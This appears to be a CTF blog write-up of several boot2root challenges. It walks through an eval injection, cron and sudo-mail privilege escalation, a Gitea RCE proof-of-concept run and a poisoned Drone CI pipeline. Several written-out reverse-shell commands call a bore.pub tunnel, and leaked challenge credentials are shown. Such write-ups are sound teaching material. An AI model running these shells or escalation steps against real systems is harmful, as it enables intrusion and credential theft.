---
layout: post
title:  "Boot2Root Challenges"
date:   2026-08-23 15:33:00 -0400
author: uzi
tags: [CTF]
permalink: /brunner-ctf-2026-boot-2-root/
---
* TOC
{:toc}

## BOREd2root (User)

**Category**: Boot2root

**Difficulty:** Beginner 

**Author:** Quack

**Description**: Congratulations on your first day here! We know it has taken a lot to get to this point, so to get you started we've prepared a small almost voluntary checklist to complete!

The tool [Bore](https://github.com/ekzhang/bore) will be useful for these types of assignments so you don't get bored!

**NOTE:** If you experience issues connecting to Bore, it may be due to network restrictions. Try again from a VPN or different network.

I go to the site:

![Alt text](/images/brunner2026web2.png)

The page contained these instructions:
Your first day

Work your way through the mandatory training guide below.
1. **Check it adds up.** Try `8 * 12`.
2. **It is not a calculator, it is Python.** `eval()` runs whatever you hand it. Try `2 ** 100`, then `len("Brunner Inc")`.
3. **Now try to read a file.** `open("flag.txt").read()`. You will get _"The calculator only prints numbers."_. That is the `isinstance` line above. You can _run_ code here, but you cannot _read_ the answer back.
4. **So make the server call you instead.** That is a reverse shell. The server opens the connection and you catch it. Start a listener on your machine with netcat: `nc -lvnp 4444`
    **Except the server cannot reach you.** Your laptop is behind NAT. It has no address the internet can dial, so there is nothing to point the shell at yet.
5. **This is what [bore](https://github.com/ekzhang/bore) is for.** It borrows a public port and forwards everything to a port on your machine. You can download a prebuilt binary from the [bore repository](https://github.com/ekzhang/bore/releases) or install it with `cargo` if you have [rust](https://rust-lang.org/learn/get-started/#installing-rust) installed: `cargo install bore-cli`. While keeping your netcat listener running, open a second terminal and run: `bore local 4444 --to bore.pub`. It prints `listening at bore.pub:41234` (with a different port). That address is now your listener. Keep both terminals open. When the public bore endpoint receives a connection, it will forward it to your local listener.
6. **Point the shell at your bore address.** Put your own port number in to spawn a reverse shell: `__import__("os").system('bash -c "bash -i >& /dev/tcp/bore.pub/41234 0>&1" &')`. The trailing `&` puts the shell in the background, so the page answers `0` straight away instead of hanging. Now look at your listener.
7. **You are in.** `cat flag.txt`
    to claim your prize and solve the first challenge.
8. **You now have access as the intern, but not root.** `cat NEXT-STEPS.txt` to continue to the journey to root.

I started my listener:
```shell
nc -lvnp 4444  
Listening on 0.0.0.0 4444
```

Then run `bore` after downloading it:
```shell
tar xzf /home/user/Downloads/bore-v0.6.0-aarch64-unknown-linux-musl.tar.gz

chmod +x bore

./bore --help  
A modern, simple TCP tunnel in Rust that exposes local ports to a remote server, bypassing standard NAT connection firewalls.  
  
Usage: bore <COMMAND>  
  
Commands:  
  local   Starts a local proxy to the remote server  
  server  Runs the remote proxy server  
  help    Print this message or the help of the given subcommand(s)  
  
Options:  
  -h, --help     Print help  
  -V, --version  Print version
  
./bore local 4444 --to bore.pub  
2026-08-21T13:24:46.891156Z  INFO bore_cli::client: connected to server remote_port=36906  
2026-08-21T13:24:46.894971Z  INFO bore_cli::client: listening at bore.pub:36906  
2026-08-21T13:25:46.405205Z  INFO proxy{id=dba5b3eb-b3f9-49a8-b45c-4338256d1af3}: bore_cli::client: new connection
```

On my listener:
```shell
nc -lvnp 4444  
Listening on 0.0.0.0 4444  
Connection received on 127.0.0.1 40006  
bash: cannot set terminal process group (1): Inappropriate ioctl for device  
bash: no job control in this shell  
intern@d-bored2root-d33c4913a8f5fd8c-global-76f7d76bb8-cpsfm:~$ id  
id  
uid=1000(intern) gid=1000(intern) groups=1000(intern)  
intern@d-bored2root-d33c4913a8f5fd8c-global-76f7d76bb8-cpsfm:~$ cat flag.txt  
cat flag.txt  
brunner{n0w_1_4m_4_c3rt1f13d_m0l3!}
```

`brunner{n0w_1_4m_4_c3rt1f13d_m0l3!}`

___

## BOREd2root (Root)

**Category**: Boot2root

**Difficulty:** Beginner  

**Author:** Quack

**Description**: Great job gaining access as the intern! Continue where you left off before and gain access to the root account! **NOTE:** This challenge should be solved after solving the `BOREd2root (User)` challenge.

I connected back and looked at `NEXT-STEPS.txt`:
```shell
intern@d-bored2root-d33c4913a8f5fd8c-global-76f7d76bb8-njwmm:~$ cat NEXT-STEPS.txt  
IT ONBOARDING, PART 2  
=======================================  
  
You have a shell as `intern`. You are not root yet. Let's fix that!  
  
1. LOOK FOR WORK THE MACHINE DOES BY ITSELF  
Scheduled jobs run with nobody sitting at the keyboard, and they  
sometimes run as root. The first place to look is:  
cat /etc/crontab  
  
There is a job in there that runs every single minute, as root.  
Note the name of the file it runs.  
  
  
2. LOOK AT WHAT THAT JOB ACTUALLY RUNS  
ls -l /usr/local/bin/backup-timesheets  
  
Read the permissions carefully:  
-rwxrwxrwx 1 root root ...  
^^^^^^^^^  
owner root ... but writable by everyone  
  
Root runs this file every minute and you are allowed to edit it.  
That is a vulnerability that we can use. Whatever you put in this file,  
root will run within sixty seconds.  
  
  
3. REPLACE IT WITH SOMETHING OF YOUR OWN  
echo '#!/bin/sh' > /usr/local/bin/backup-timesheets  
echo 'chmod u+s /bin/bash' >> /usr/local/bin/backup-timesheets  
  
Mind the difference: the first line uses one `>` and overwrites the  
file, the second uses `>>` and appends to it.  
  
`chmod u+s` sets the SUID bit on /bin/bash. A SUID program runs with  
the privileges of whoever owns it, no matter who starts it. /bin/bash  
is owned by root, meaning we can use it as root.  
  
  
4. WAIT FOR THE JOB  
It runs every minute. Go make tea, then check:  
ls -l /bin/bash  
  
Waiting for this to change:  
-rwxr-xr-x   ->   -rwsr-xr-x  
^  
that s means SUID is set  
  
  
5. TAKE YOUR ROOT SHELL  
bash -p  
  
The -p tells bash to keep those extra privileges instead of politely  
dropping them on startup. Then:  
id  
whoami  
cat /root/root.txt
```

A cronjob runs `/usr/local/bin/backup-timesheets` every 60 seconds. Put commands into the file which make `/bin/bash` have the SUID bit set. Then get root:
```shell
intern@d-bored2root-d33c4913a8f5fd8c-global-76f7d76bb8-njwmm:~$ echo '#!/bin/sh' > /usr/local/bin/backup-timesheets && echo 'chmod u+s /bin/bash' >> /usr/local/bin/backup-time  
sheets  
intern@d-bored2root-d33c4913a8f5fd8c-global-76f7d76bb8-njwmm:~$ cat /usr/local/bin/backup-timesheets  
#!/bin/sh  
chmod u+s /bin/bash  
intern@d-bored2root-d33c4913a8f5fd8c-global-76f7d76bb8-njwmm:~$ ls -l /bin/bash  
-rwsr-xr-x. 1 root root 1298416 May  9 11:07 /bin/bash  
intern@d-bored2root-d33c4913a8f5fd8c-global-76f7d76bb8-njwmm:~$ bash -p  
bash-5.2# ls -la /root  
total 16  
drwx------. 1 root root  16 Aug 19 14:43 .  
drwxr-xr-x. 1 root root  30 Aug 21 14:11 ..  
-rw-r--r--. 1 root root 607 Jul  4 09:05 .bashrc  
-rw-r--r--. 1 root root 132 Jul  4 09:05 .profile  
drwx------. 1 root root   0 Aug 19 14:43 .ssh  
-rw-r--r--. 1 root root 169 Aug  5 16:26 .wget-hsts  
-r--------. 1 root root  40 Aug 19 14:43 root.txt  
bash-5.2# cat /root/root.txt  
brunner{d0wn_d0wn_d0wn_th3_r00t1t_h013}
```

`brunner{d0wn_d0wn_d0wn_th3_r00t1t_h013}`

___

## Brunner Mifflin (User)

**Category**: Boot2root

**Difficulty:** Easy

**Author:** Emil8250

**Description**: You have found the Brunner Mifflin HR system, and your curious nature makes you wonder if you can view all the monsters?

I get the challenge file:
```shell
unzip boot2root_brunner-mifflin-user.zip  
Archive:  boot2root_brunner-mifflin-user.zip  
   creating: boot2root_brunner-mifflin-user/  
  inflating: boot2root_brunner-mifflin-user/UserController.cs
  
cat UserController.cs
﻿using Microsoft.AspNetCore.Mvc;

namespace OrderingApi;

[Route("api/[controller]")]
[ApiController]
public class UserController : ControllerBase
{
    
    [HttpGet("{id}")]
    public IActionResult Get([FromRoute]int id)
    {
        var users = GetUsers();

        if (id < 0 || id > users.Length)
            return NotFound(new { Error = "User not found" });

        return Ok(users[id]);
    }
    
    [HttpGet("Admin/{role}")]
    public IActionResult Get([FromRoute]string role)
    {
        if(role.ToLower() == "itguy")
            return Ok("<REDACTED>");

        return Unauthorized("Only members of IT has access to this dashboard");
    }
}
```

I go to the site:

![Alt text](/images/brunner2026web7.png)

On `https://brunner-mifflin-user-0f408206023eef44-global.challs.brunnerne.xyz/api.js` I found this:
```js
const API_BASE_URL = '/api/';

async function getOrderIndex() {
    try {
        const response = await fetch(`${API_BASE_URL}Order`);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.text();
        return data;
    } catch (error) {
        console.error('Error fetching order:', error);
        throw error;
    }
}

async function getAdmin(role) {
    try {
        const response = await fetch(`${API_BASE_URL}User/Admin/${role}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status} - ${await response.text()} `);
        }
        const data = await response.text();
        return data;
    } catch (error) {
        console.error('Error fetching admin:', error);
        throw error;
    }
}

async function terminalLogin(username, password) {
    try {
        const response = await fetch(`${API_BASE_URL}Terminal/Login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
        });
        if (!response.ok) {
            throw new Error('Login incorrect');
        }
        const data = await response.json();
        return data.token;
    } catch (error) {
        console.error('Error starting terminal session:', error);
        throw error;
    }
}

async function getUser(id) {
    try {
        const response = await fetch(`${API_BASE_URL}User/${id}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.text();
        return data;
    } catch (error) {
        console.error('Error fetching user:', error);
        throw error;
    }
}
```

`getAdmin()` simply works like: `/api/User/Admin/{role}`

```shell
curl https://brunner-mifflin-user-0f408206023eef44-global.challs.brunnerne.xyz/api/User/admin/itguy  
To setup e-mail survailance I connect through the IT web terminal at /terminal with my username: itguy and my password: itguy321 <br /> brunner{1tGuyW111F1x}
```

`brunner{1tGuyW111F1x}`

___

## Brunner Mifflin (Root)

**Category**: Boot2root

**Difficulty:** Easy

**Author:** Quack

**Description**: Now that you have access to the internal system, please help investigate the rumours regarding company-wide email surveillance being used to spy on all employees. Perhaps you can turn it against them? **NOTE:** You need to solve `Brunner Mifflin (User)` first.

I go back to the site and login with the creds `itguy:itguy321`. Once logged in I can access `/terminal` and on the page it says: 
```shell
Remote shell access for the Brunner Mifflin IT department.
```

Im able to execute commands on the page:
```shell
itguy@d-brunner-mifflin-user-0f408206023eef44-global-55ff76df8c-h2g8g:~$ id
uid=1655(itguy) gid=1655(itguy) groups=1655(itguy)
```

I ran `sudo -l`:
```shell
itguy@d-brunner-mifflin-user-0f408206023eef44-global-55ff76df8c-h2g8g:~$ <0f408206023eef44-global-55ff76df8c-h2g8g:~$ sudo -l                     Matching Defaults entries for itguy on
    d-brunner-mifflin-user-0f408206023eef44-global-55ff76df8c-h2g8g:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User itguy may run the following commands on
        d-brunner-mifflin-user-0f408206023eef44-global-55ff76df8c-h2g8g:
    (root) NOPASSWD: /usr/bin/mail
```
Looks like I can run `/usr/bin/mail` with `sudo`!

I went to [https://gtfobins.org/gtfobins/mail/](https://gtfobins.org/gtfobins/mail/) to find possible escalation techniques. 

I found that `sudo mail --exec='!/bin/sh'` will give me root:
```shell
itguy@d-brunner-mifflin-user-0f408206023eef44-global-55ff76df8c-h2g8g:~$ <bal-55ff76df8c-h2g8g:~$ sudo mail --exec='!/bin/sh'
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
flag.txt
# cat /root/flag.txt
brunner{1tguy_t4k35_m41l_s3cur1ty_v3ry_53r10u5}
```

`brunner{1tguy_t4k35_m41l_s3cur1ty_v3ry_53r10u5}`

___

## The Three Ways - Flow

**Category**: Boot2root

**Difficulty:** Medium

**Author:** Quack

**Description**: Team, we did it. We have officially eliminated friction. Permission gates? Deprecated. Approval queues? A fixed mindset we've chosen to leave behind. Here at Brunnerne Inc.™, value flows left to right, unblocked, empowered and self-service.

Onboarding note for our new contractors: Welcome aboard! Your access is intentionally minimal, go create beautiful value for our shareholders. We're certain you will go down in history!

Credentials: `brunner_dev:dev_go_brr`

**NOTE:** Please allow up to 5 minutes for the challenge to become ready.

I get two links:
```shell
https://gitea-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz
https://drone-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz
```

Going to the [drone](https://www.drone.io/) link just redirects me to gitea. It runs `Drone by harness` which automates software building and testing. I went to gitea and logged in with the provided creds. They are running [Gitea](https://about.gitea.com) Version: 1.21.6!

I logged in and found 2 repos. While looking at the history on `https://gitea-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz/brunner_ops/ci-bootstrap/commit/19744fc6df65d6666b27da293020a8be7b407177` I found this:
```shell
GITEA_URL=https://gitea-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz
GITEA_USER=brunner_ci
GITEA_PASSWORD=9d41c07be5a8426fa3c15b2e70f8d63a
GITEA_PASSWORD=${GITEA_PASSWORD:?set GITEA_PASSWORD first, see .env.example}

REPOS="brunner_admin/hello-drone brunner_ops/deploy-tools brunner_ops/internal-deploy"
```
Nice. New creds. 

I logged in with the new creds and found a new private repo. I can now also access `https://drone-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz`. I can make a request like this now:
```shell
curl -i https://drone-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz/api/user \  
-H "Authorization: Bearer 45df62c55ffeebef1cb05bfbaa3ea8e2"  
HTTP/2 200  
cache-control: no-cache, no-store, must-revalidate, private, max-age=0  
content-type: application/json  
date: Fri, 21 Aug 2026 17:32:59 GMT  
expires: Thu, 01 Jan 1970 00:00:00 UTC  
pragma: no-cache  
vary: Origin  
x-accel-expires: 0  
x-deployment-id: the-three-ways-flow-a9eb13bb76fd54ea-global  
x-team-id: 306  
x-terminal-id: global  
content-length: 292  
  
{"id":4,"login":"brunner_ci","email":"ci@example.com","machine":false,"admin":false,"active":true,"avatar":"https://secure.gravatar.com/avatar/90cc86b006f7607b89d511f023a0f0b0?d=identicon","syncing":false,"synced":1787332235,"created":1787332227,"updated":1787332227,"last_login":1787333474}
```
Not sure what this can do for me.

Soon I found [CVE-2026-60004](https://thehackernews.com/2026/07/new-gitea-rce-lets-repository-writers.html). I went to [https://github.com/imbas007/CVE-2026-60004-POC](https://github.com/imbas007/CVE-2026-60004-POC) and downloaded the POC script.

Exploit Chain Diagram straight from [https://github.com/imbas007/CVE-2026-60004-POC](https://github.com/imbas007/CVE-2026-60004-POC):
```
Attacker                              Gitea Server
   │                                      │
   ├─ POST /user/sign_up ────────────────►│  Register new user
   │                                      │
   ├─ POST /api/v1/user/repos ───────────►│  Create private repo (auto-init)
   │                                      │
   ├─ GET /api/v1/repos/.../branches ────►│  Get commit SHA
   │                                      │
   ├─ POST /api/v1/repos/.../diffpatch ──►│  1st patch: plant hook
   │                                      │  Git creates bare clone
   │                                      │  Applies patch (--cached)
   │                                      │
   ├─ POST /api/v1/repos/.../diffpatch ──►│  2nd patch: SAME PATCH
   │   (same exact patch!)                │  ADD/ADD COLLISION!
   │                                      │  Git -3 fallback writes to disk
   │                                      │  hooks/post-index-change created
   │                                      │  Git fires post-index-change hook!
   │                                      │  ┌─ Command executes ─┐
   │                                      │  │ reads /etc/passwd  │
   │                                      │  │ stores in git blob │
   │                                      │  │ creates rce-proof  │
   │                                      │  │ branch             │
   │                                      │  └────────────────────┘
   │                                      │
   ├─ GET /api/v1/repos/.../raw/proof ───►│  Retrieve output
   │◄─────────────────────────────────────┤  /etc/passwd contents
   │                                      │
```

When I run it with the new creds it confirms RCE!
```shell
python3 cve-2026-60004.py --url https://gitea-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz/ --mode semi-auto --user brunner_ci --pw '9d41c07be5a8426fa3c15b2e70f8d63a'  
  
   ┌──────────────────────────────────────────────────────────────┐  
   │  CVE-2026-60004  │  Gitea Pre-Auth RCE  │  CVSS 9.8 (CRIT)  │  
   │  diffpatch → git hook injection  │  v1.17–1.27.0 affected   │  
   └──────────────────────────────────────────────────────────────┘  
  
Target : https://gitea-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz/  
Mode   : semi-auto  
Command: cat /etc/passwd  
  
[*] Gitea version: 1.21.6  
  
[*] --- Step 1: Verify credentials ---  
[+] Authenticated as: brunner_ci  
  
[*] --- Step 2: Create repository ---  
[*] Creating repository: brunner_ci/poc-khymw  
[+] Repository created: brunner_ci/poc-khymw  
  
[*] --- Step 3: Exploit ---  
  
[*] Exploiting: https://gitea-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz/api/v1/repos/brunner_ci/poc-khymw/diffpatch  
[*] Command: cat /etc/passwd  
[*] Send count: 3  
[+] Branch SHA: 7649c420940e...  
[*] Hook blob SHA1: 3654ca73cce52ca6d33006f1ae8135da05fcc3a4  
[+] Send #1 -> HTTP 201  new_sha=da178888588f...  
[+] Send #2 -> HTTP 201  new_sha=6465ac1c1e62...  
[+] Send #3 -> HTTP 201  new_sha=91b77d2a4005...  
[+] Exploit delivered! Hook should have executed.  
  
[*] --- Step 4: Retrieve command output ---  
[*] Retrieving output from: /api/v1/repos/brunner_ci/poc-khymw/raw/proof?ref=rce-proof  
[+] Output retrieved (attempt 1):  
────────────────────────────────────────────────────────────  
root:x:0:0:root:/root:/bin/ash  
bin:x:1:1:bin:/bin:/sbin/nologin  
daemon:x:2:2:daemon:/sbin:/sbin/nologin  
adm:x:3:4:adm:/var/adm:/sbin/nologin  
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin  
sync:x:5:0:sync:/sbin:/bin/sync  
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown  
halt:x:7:0:halt:/sbin:/sbin/halt  
mail:x:8:12:mail:/var/mail:/sbin/nologin  
news:x:9:13:news:/usr/lib/news:/sbin/nologin  
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin  
operator:x:11:0:operator:/root:/sbin/nologin  
man:x:13:15:man:/usr/man:/sbin/nologin  
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin  
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin  
ftp:x:21:21::/var/lib/ftp:/sbin/nologin  
sshd:x:22:22:sshd:/dev/null:/sbin/nologin  
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin  
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin  
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin  
games:x:35:35:games:/usr/games:/sbin/nologin  
cyrus:x:85:12::/usr/cyrus:/sbin/nologin  
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin  
ntp:x:123:123:NTP:/var/empty:/sbin/nologin  
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin  
guest:x:405:100:guest:/dev/null:/sbin/nologin  
nobody:x:65534:65534:nobody:/:/sbin/nologin  
catchlog:x:100:101:catchlog:/:/bin/false  
git:x:1000:1000:Linux User,,,:/data/git:/bin/bash  
  
────────────────────────────────────────────────────────────  
  
[✓] Exploitation successful!  
  
[*] Done.
```

I start a listener with `nc` and `bore` to get a reverse shell:
```shell
nc -lvnp 4444  
Listening on 0.0.0.0 4444

./bore local 4444 --to bore.pub  
2026-08-21T18:05:51.386294Z  INFO bore_cli::client: connected to server remote_port=46645  
2026-08-21T18:05:51.391636Z  INFO bore_cli::client: listening at bore.pub:46645

python3 cve-2026-60004.py --url https://gitea-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz/ --mode semi-auto --user brunner_ci --pw '9d41c07be5a8426fa3c15b2e70f8d63a' --cmd 'bash -c "bash -i >& /dev/tcp/bore.pub/46645 0>&1"'
```

I get the shell:
```shell
nc -lvnp 4444  
Listening on 0.0.0.0 4444  
Connection received on 127.0.0.1 38646  
bash: cannot set terminal process group (7955): Not a tty  
bash: no job control in this shell  
<kw:/data/gitea/tmp/local-repo/upload.git755290089$ id  
id  
uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
```

I found new creds in `/tmp/users.list`:
```shell
<t:/data/gitea/tmp/local-repo/upload.git3914663066$ cat /tmp/users.list  
cat /tmp/users.list  
brunner_admin,admin@example.com,10fdf3314adf503c28658b5829e69c06cfabe061c09365b1e2959d45fae807a6,true,public  
brunner_dev,dev@example.com,dev_go_brr,false,public  
brunner_ops,ops@example.com,brunner_0ps_d3pl0y_k3y_pls_no_share,false,public  
brunner_ci,ci@example.com,9d41c07be5a8426fa3c15b2e70f8d63a,false,public  
brunner_svc,svc@example.com,4c1f7e0b93a64d5f8072bd1ac6e35914,false,private
```
 
`brunner_ops:brunner_0ps_d3pl0y_k3y_pls_no_share`
`brunner_svc:4c1f7e0b93a64d5f8072bd1ac6e35914`
`brunner_admin:10fdf3314adf503c28658b5829e69c06cfabe061c09365b1e2959d45fae807a6`

I logged into gitea with the `brunner_admin` credentials and found `https://gitea-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz/brunner_admin/platform-bootstrap/commit/c3d05fee038577e0a31090eca36f5af390ce19c3` where they expose some potentially interesting stuff:
```shell
CLIENT_ID=494f45bb-74f5-4aac-82ba-8f8e2e1e2a73
CLIENT_SECRET=gto_hdypts6jb3twaluhkmjw5hvbelhiantwcu4imugfi4jjtdmpcwca
brunner_admin admin@example.com true eyJhbGciOiJSUzI1NiIsImtpZCI6IjVyTHk0Qm5KWkxZbEtxN0lPNE9WUWdaRTlVQ292clNWdTlNdnF3NHhEa1kiLCJ0eXAiOiJKV1QifQ.eyJpYXQiOjE3ODc0MjMzMTcsImV4cCI6MjEwMjc4MzMxNywiZ250IjoxLCJ0dCI6MH0.JBlxV46jGqJEv5ftOST91xO2jYJPJglr ...

... etc ...
```

After about 6 hours of looking around.... I tried to become the `drone` user!! I realized its on a different host.

I started a new listener and ran a new `bore` command:
```shell
nc -lvnp 5555  
Listening on 0.0.0.0 5555

./bore local 5555 --to bore.pub  
2026-08-22T22:43:21.151031Z  INFO bore_cli::client: connected to server remote_port=64827  
2026-08-22T22:43:21.155117Z  INFO bore_cli::client: listening at bore.pub:64827
```

I used `git clone` to clone the `hello-drone` repo to the `/tmp` directory. I had to run `unset GIT_DIR GIT_WORK_TREE GIT_IMPLICIT_WORK_TREE GIT_PREFIX ` to be able to run git commands:
```shell
<76fd54ea-global-5c648dbfcb-2tl9t:/tmp/hello-drone$ unset GIT_DIR GIT_WORK_TREE GIT_IMPLICIT_WORK_TREE GIT_PREFIX 
<76fd54ea-global-5c648dbfcb-2tl9t:/tmp/hello-drone$ git status  
On branch main  
Your branch is up to date with 'origin/main'.  
  
Changes not staged for commit:  
  (use "git add <file>..." to update what will be committed)  
  (use "git restore <file>..." to discard changes in working directory)  
		modified:   .drone.yml  
  
no changes added to commit (use "git add" and/or "git commit -a")
```

Once I was there I ran this to insert the command to be run as the `drone` user:
```shell
cat > .drone.yml << 'EOF'
kind: pipeline
type: exec
name: default

platform:
  os: linux
  arch: amd64

steps:
  - name: test
    commands:
      - echo skip

  - name: build
    commands:
      - bash -c "bash -i >& /dev/tcp/bore.pub/64827 0>&1"
EOF
```

`type: exec` means Drone runs pipeline steps as raw shell commands directly on the runner host, not inside a container:
```yaml
kind: pipeline 
type: exec
```

Then I run:
```shell
git add .drone.yml
git commit -m "debug4"
git push
```

I get my new shell:
```shell
nc -lvnp 5555  
Listening on 0.0.0.0 5555  
Connection received on 127.0.0.1 35806  
bash: cannot set terminal process group (1): Not a tty  
bash: no job control in this shell  
<t:/var/lib/drone/drone-K44AKwW5tsspJAm6/drone/src$ id 
uid=1000(drone) gid=1000(drone) groups=1000(drone)
d-the-three-ways-flow-a9eb13bb76fd54ea-global-5c648dbfcb-2tl9t:/$ cat /home/drone/flag.txt  
brunner{4ch13v3_4bs0lut3_fl0w_st4t3}
```

`brunner{4ch13v3_4bs0lut3_fl0w_st4t3}`

___

## The Three Ways - Feedback

**Category**: Boot2root

**Difficulty:** Medium-Hard  

**Author:** Quack

**Description**: Brunnerne is a blameless, feedback-rich organisation. Every pull request runs our world-class verification pipeline, because we believe great ideas can come from anywhere, even outside the team. Especially outside the team. We're inclusive like that.

Rest assured: our secrets are handled to industry-adjacent standards and our logs are appropriately redacted.

**NOTE**: This challenge can only be completed after solving `The Three Ways - Flow`.

I just ran `env` in my reverse shell from the `The Three Ways - Flow` challenge:
```shell
<kw:/data/gitea/tmp/local-repo/upload.git755290089$ env  
env  
DRONE_HOST=drone-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz  
KUBERNETES_SERVICE_PORT_HTTPS=443  
KUBERNETES_SERVICE_PORT=443  
GIT_CONFIG_PARAMETERS='protocol.version'='2' 'credential.helper'=''  
USER_UID=1000  
HOSTNAME=d-the-three-ways-flow-a9eb13bb76fd54ea-global-5c648dbfcb-s2mkw  
GIT_NO_REPLACE_OBJECTS=1  
GNUPGHOME=/data/gitea/home/.gnupg  
GIT_DIR=.  
PWD=/data/gitea/tmp/local-repo/upload.git755290089  
FLAG_2=brunner{n0_s3cr3t5_4r3_t00_s3cr3t_f0r_u}  
GITEA_WORK_DIR=/data/gitea  
USER_GID=1000  
GIT_EXEC_PATH=/usr/libexec/git-core  
HOME=/data/gitea/home  
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443

... etc ...
```

Or like this:
```shell
d-the-three-ways-flow-a9eb13bb76fd54ea-global-5c648dbfcb-2tl9t:/tmp$ tar -xzf /data/gitea/packages/f1/a4/f1a4c744f89e97541d655053e10b781b55efd393935be002896b039ac667a630 -O bundle/config/deploy.env
REGISTRY_API=https://gitea-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz/api/v1  
REGISTRY_URL=https://gitea-the-three-ways-flow-a9eb13bb76fd54ea-global.challs.brunnerne.xyz/api/packages/brunner_registry/generic  
REGISTRY_ORG=brunner_registry  
REGISTRY_USER=brunner_svc  
REGISTRY_PUBLISH_TOKEN="489aa1038263bafc0076bf8f8b6280b1abbcbac7"  
ROTATION_CODE="brunner{n0_s3cr3t5_4r3_t00_s3cr3t_f0r_u}"
```

`brunner{n0_s3cr3t5_4r3_t00_s3cr3t_f0r_u}`

___

## The Three Ways - Continuous Improvement

**Category**: Boot2root

**Difficulty:** Medium-Hard  

**Author:** Quack

**Description**: The dream is finally live: fully autonomous continuous delivery. Our rollout agent installs the latest and greatest across the entire fleet, all by itself, no humans required. It's tireless, it's trusting and it runs with the utmost privilege, because we believe in it.

Some colleagues asked about signing artifacts. We've added that to the backlog, right behind the cake budget. 

Now that I am the `drone` user I started looking around. I found `rollout-agent.py`:
```shell
d-the-three-ways-flow-a9eb13bb76fd54ea-global-5c648dbfcb-2tl9t:/tmp$ ls -la /usr/local/bin/  

... etc ...

-rwxr-xr-x    1 root     root         14000 Aug 13 19:39 python3.12  
-rwxr-xr-x    1 root     root          3020 Aug 13 19:39 python3.12-config  
-rwxr-xr-x    1 root     root         11378 Aug 19 05:07 rollout-agent.py
```

`rollout-agent.py` runs as root (spawned by `pip-entrypoint.sh` before the container drops to `su-exec drone`) and polls the gitea package registry for new versions of `rollout-bundle`. When it finds one newer than whats installed it downloads it, validates it, and executes `hooks/postinstall` as root! Essentially nothing in the validation confirms the publisher is authorized. It only checks that the contents match their own declared checksums. Pretty easy.

The script trusts any accounts with write access to the `brunner_registry` org. I already have `brunner_admin` credentials via `CVE-2026-60004`. I can simply publish a bundle and sign it against itself. 

From the script:
```python
def validate(bundle, package, version):
    manifest_path = bundle / "manifest.json"
    if not manifest_path.is_file():
        raise ValueError("manifest.json is missing")
    try:
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as exc:
        raise ValueError("manifest.json is not valid json: %s" % exc)
    if manifest.get("package") != package:
        raise ValueError(
            "manifest package %r does not match %r" % (manifest.get("package"), package)
        )
    if manifest.get("version") != version:
        raise ValueError(
            "manifest version %r does not match the published version %r"
            % (manifest.get("version"), version)
        )

    sums_path = bundle / "SHA256SUMS"
    if not sums_path.is_file():
        raise ValueError("SHA256SUMS is missing")
    expected = parse_sums(sums_path)

    present = {}
    for path in sorted(bundle.rglob("*")):
        relative = str(path.relative_to(bundle)).replace(os.sep, "/")
        if path.is_symlink():
            raise ValueError("%s is a symlink" % relative)
        if path.is_file():
            present[relative] = path
    present.pop("SHA256SUMS", None)

    unlisted = sorted(set(present) - set(expected))
    if unlisted:
        raise ValueError("not listed in SHA256SUMS: %s" % ", ".join(unlisted))
    absent = sorted(set(expected) - set(present))
    if absent:
        raise ValueError("listed in SHA256SUMS but not shipped: %s" % ", ".join(absent))
    for name, digest in sorted(expected.items()):
        if hashlib.sha256(present[name].read_bytes()).hexdigest() != digest:
            raise ValueError("checksum mismatch for %s" % name)

    hook = (manifest.get("hooks") or {}).get("postinstall")
    if not hook:
        raise ValueError("manifest declares no hooks.postinstall")
    if hook.startswith("/") or ".." in pathlib.PurePosixPath(hook).parts:
        raise ValueError("hooks.postinstall must be a relative path in the bundle: %r" % hook)
    if hook not in present:
        raise ValueError("hooks.postinstall %r is not in the bundle" % hook)
    return hook
```

This executes it:
```python
def run_hook(target, hook, version):
    environment = {
        "PATH": "/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin",
        "HOME": "/root",
        "ROLLOUT_VERSION": version,
        "ROLLOUT_ROOT": str(target),
    }
    try:
        proc = subprocess.run(
            ["/bin/sh", hook],
            cwd=str(target),
            env=environment,
            capture_output=True,
            text=True,
            timeout=HOOK_TIMEOUT,
        )

... etc ...
```
`hook` is the path taken straight from attacker controlled `manifest.json`!
